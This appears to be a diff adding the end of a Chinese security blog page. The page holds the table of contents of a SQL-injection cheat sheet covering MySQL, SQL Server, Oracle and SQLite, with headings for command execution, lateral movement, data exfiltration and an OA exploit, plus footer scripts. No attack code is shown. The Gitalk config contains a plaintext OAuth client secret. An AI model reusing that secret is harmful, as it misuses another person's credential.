+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Mysql"><span class="nav-number">1.</span> <span class="nav-text">Mysql</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#攻击队列"><span class="nav-number">1.1.</span> <span class="nav-text">攻击队列</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#信息收集"><span class="nav-number">1.1.1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#数据定位查询"><span class="nav-number">1.1.2.</span> <span class="nav-text">数据定位查询</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#命令执行"><span class="nav-number">1.1.3.</span> <span class="nav-text">命令执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#读写文件"><span class="nav-number">1.1.4.</span> <span class="nav-text">读写文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#横向运动"><span class="nav-number">1.1.5.</span> <span class="nav-text">横向运动</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#数据泄露"><span class="nav-number">1.1.6.</span> <span class="nav-text">数据泄露</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#注入类型"><span class="nav-number">1.2.</span> <span class="nav-text">注入类型</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Error-Based"><span class="nav-number">1.2.1.</span> <span class="nav-text">Error Based</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Union-Based-Injection"><span class="nav-number">1.2.2.</span> <span class="nav-text">Union-Based Injection</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Blind-Injection"><span class="nav-number">1.2.3.</span> <span class="nav-text">Blind Injection</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Partial-Blind"><span class="nav-number">1.2.3.1.</span> <span class="nav-text">Partial-Blind</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Full-Blind"><span class="nav-number">1.2.3.2.</span> <span class="nav-text">Full-Blind</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MariaDB"><span class="nav-number">2.</span> <span class="nav-text">MariaDB</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#常用语句"><span class="nav-number">2.0.1.</span> <span class="nav-text">常用语句</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SQL-Server"><span class="nav-number">3.</span> <span class="nav-text">SQL Server</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#攻击队列-1"><span class="nav-number">3.1.</span> <span class="nav-text">攻击队列</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#信息收集-1"><span class="nav-number">3.1.1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#数据定位"><span class="nav-number">3.1.2.</span> <span class="nav-text">数据定位</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#特权提升"><span class="nav-number">3.1.3.</span> <span class="nav-text">特权提升</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#通过SQL-Server执行OS命令"><span class="nav-number">3.1.4.</span> <span class="nav-text">通过SQL Server执行OS命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#读写文件-1"><span class="nav-number">3.1.5.</span> <span class="nav-text">读写文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#横向移动"><span class="nav-number">3.1.6.</span> <span class="nav-text">横向移动</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Data-Exfiltration"><span class="nav-number">3.1.7.</span> <span class="nav-text">Data Exfiltration</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#权限维持"><span class="nav-number">3.1.8.</span> <span class="nav-text">权限维持</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#注入类型-1"><span class="nav-number">3.2.</span> <span class="nav-text">注入类型</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Error-Based-1"><span class="nav-number">3.2.1.</span> <span class="nav-text">Error Based</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Union-Based-Injection-1"><span class="nav-number">3.2.2.</span> <span class="nav-text">Union-Based Injection</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Blind-Injection-1"><span class="nav-number">3.2.3.</span> <span class="nav-text">Blind Injection</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Oracle"><span class="nav-number">4.</span> <span class="nav-text">Oracle</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#攻击队列-2"><span class="nav-number">4.1.</span> <span class="nav-text">攻击队列</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#信息收集-2"><span class="nav-number">4.1.1.</span> <span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Data-Exfiltration-1"><span class="nav-number">4.1.2.</span> <span class="nav-text">Data Exfiltration</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#注入类型-2"><span class="nav-number">4.2.</span> <span class="nav-text">注入类型</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Error-Based-2"><span class="nav-number">4.2.1.</span> <span class="nav-text">Error Based</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Union-Based-Injection-2"><span class="nav-number">4.2.2.</span> <span class="nav-text">Union-Based Injection</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Blind-Injection-2"><span class="nav-number">4.2.3.</span> <span class="nav-text">Blind Injection</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Oracle-注入一般步骤："><span class="nav-number">4.3.</span> <span class="nav-text">Oracle 注入一般步骤：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#显性注入：简单快捷的用法"><span class="nav-number">4.3.1.</span> <span class="nav-text">显性注入：简单快捷的用法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#显性注入：通用"><span class="nav-number">4.3.2.</span> <span class="nav-text">显性注入：通用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#判断注入点"><span class="nav-number">4.3.2.1.</span> <span class="nav-text">判断注入点</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#判断字段数"><span class="nav-number">4.3.2.2.</span> <span class="nav-text">判断字段数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#填充字段"><span class="nav-number">4.3.2.3.</span> <span class="nav-text">填充字段</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#获取数据"><span class="nav-number">4.3.2.4.</span> <span class="nav-text">获取数据</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#获取系统信息"><span class="nav-number">4.3.2.4.1.</span> <span class="nav-text">获取系统信息</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#获取表名"><span class="nav-number">4.3.2.4.2.</span> <span class="nav-text">获取表名</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#获取字段名"><span class="nav-number">4.3.2.4.3.</span> <span class="nav-text">获取字段名</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#查询指定表中字段内容"><span class="nav-number">4.3.2.4.4.</span> <span class="nav-text">查询指定表中字段内容</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#泛微OA-EXP编写"><span class="nav-number">4.3.2.5.</span> <span class="nav-text">泛微OA EXP编写</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Sqlite"><span class="nav-number">5.</span> <span class="nav-text">Sqlite</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#常用信息及语句"><span class="nav-number">5.1.</span> <span class="nav-text">常用信息及语句</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BOOL盲注"><span class="nav-number">5.2.</span> <span class="nav-text">BOOL盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#延时盲注"><span class="nav-number">5.3.</span> <span class="nav-text">延时盲注</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#写文件"><span class="nav-number">5.4.</span> <span class="nav-text">写文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#读文件"><span class="nav-number">5.5.</span> <span class="nav-text">读文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#实验靶场"><span class="nav-number">5.6.</span> <span class="nav-text">实验靶场</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Wh0ale</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">1.4m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">21:52</span>
+</div>
+
+<div>
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("03/31/2019 00:00:00");
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="总访客量">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="总访问量">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+  </div>
+
+  
+    
+    
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+  <script src="/lib/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script src="/lib/reading_progress/reading_progress.js"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  <script src="/js/utils.js?v=7.3.0"></script>
+  <script src="/js/motion.js?v=7.3.0"></script>
+
+  
+  <script src="/js/affix.js?v=7.3.0"></script>
+  <script src="/js/schemes/pisces.js?v=7.3.0"></script>
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.3.0"></script>
+<script src="/js/post-details.js?v=7.3.0"></script>
+
+
+
+  <script src="/js/next-boot.js?v=7.3.0"></script>
+
+  
+
+  
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.3.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+<script src="//cdn.jsdelivr.net/npm/js-md5@0.7.3/src/md5.min.js"></script>
+
+<script>
+  var gitalk = new Gitalk({
+    clientID: '925b9aa350afc793e04c',
+    clientSecret: 'bcd92ef416b81450a12e6388b00dfa49f798437a',
+    repo: 'Wh0ale.github.io',
+    owner: 'Wh0ale',
+    admin: ['Wh0ale'],
+    id: md5(location.pathname),
+      language: window.navigator.language || window.navigator.userLanguage,
+    
+    distractionFreeMode: 'true'
+  });
+  gitalk.render('gitalk-container');
+</script>
+
+
+</body>
+</html>
